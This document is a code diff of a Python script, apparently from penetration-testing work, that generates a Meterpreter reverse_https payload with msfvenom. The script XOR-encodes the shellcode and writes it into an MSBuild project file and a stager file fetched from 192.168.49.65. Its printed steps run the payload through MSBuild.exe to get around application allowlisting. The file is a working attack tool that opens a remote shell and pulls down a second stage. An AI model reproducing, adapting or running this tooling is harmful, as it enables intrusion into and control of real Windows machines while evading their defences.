@@ -1,12 +1,11 @@
 #!/bin/env python3
 from ak import *
+import ak
 import os
 import subprocess
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_msbuild_runner'
-MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
+MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 XOR_KEY = b'\x09'
 STAGER_URL = "http://192.168.49.65/winmsbuildrunner_s2"
 
@@ -83,27 +82,14 @@ def generate(shellcode):
 
 """.format(xor_shellcode_hex=shellcode.get_hex_csharp(), stager_url=STAGER_URL, xor_key=shellcode.get_key_csharp())
 
-  print(template)
-  f = open(BASE_FILENAME + '.xml', "w")
-  f.write(template)
-  f.close()
-
-  f = open(BASE_FILENAME + '.sc', 'wb')
-  f.write(shellcode.get_bytes())
-  f.close()
-
-  print("Wrote encrypted shellcode to: " + BASE_FILENAME + '.sc')
-
-def compile():
-  cmd = f"mcs {BASE_FILENAME}.cs"
-  os.system(cmd)
+  ak.write_file(BASE_FILENAME + '.csproj', template)
+  ak.write_file(BASE_FILENAME + '.sc', shellcode.get_bytes())
 
 def main():
   shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
 
   generate(shellcode)
 
-  print("Wrote to: "+ BASE_FILENAME + ".csproj")
   print("Run with: C:\Windows\Microsoft.NET\Framework\\v4.0.30319\MSBuild.exe "+BASE_FILENAME + ".csproj")
   print("Copy {}.sc to: {}".format(BASE_FILENAME,STAGER_URL))
 
